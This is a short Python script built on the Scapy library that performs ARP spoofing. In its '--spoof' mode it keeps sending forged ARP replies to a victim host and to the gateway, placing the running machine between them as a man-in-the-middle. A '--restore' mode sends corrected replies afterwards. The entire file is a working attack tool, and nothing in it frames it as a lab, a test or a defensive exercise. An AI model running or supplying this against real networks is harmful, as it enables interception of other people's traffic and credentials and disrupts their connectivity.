import scapy.all as scapy
import time
import sys
sys.dont_write_bytecode = True

interval = 2
ip_target = sys.argv[2]
ip_gateway = sys.argv[3]

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

if sys.argv[1] == "--spoof":
    print(f"Spoofing victim: {ip_target}", flush=True)
    while True:
        print("Sending 2 packets!", flush=True)
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        time.sleep(interval)
elif sys.argv[1] == "--restore":
    print("Attack ended, restoring ip arrangement!", flush=True)
    restore(ip_gateway, ip_target)
    restore(ip_target, ip_gateway)
    exit()